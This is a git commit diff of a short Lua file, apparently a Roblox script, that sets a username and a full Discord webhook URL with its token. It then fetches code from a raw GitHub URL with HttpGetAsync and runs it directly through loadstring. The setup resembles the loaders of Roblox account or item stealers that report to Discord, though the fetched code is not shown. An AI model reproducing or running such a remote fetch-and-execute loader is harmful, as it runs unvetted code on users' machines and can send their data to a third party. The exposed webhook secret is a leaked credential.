7bf3195f80c6c22f5830e10bdef6b281c10c3e09
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-09 23:14:55 +0200

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,3 +1,4 @@
 UserName = "HerrySzymoN"
 WebHook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/HerrSimoNHub/test/main/test.lua"))()
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/HerrSimoNHub/test/main/test.lua", true))()
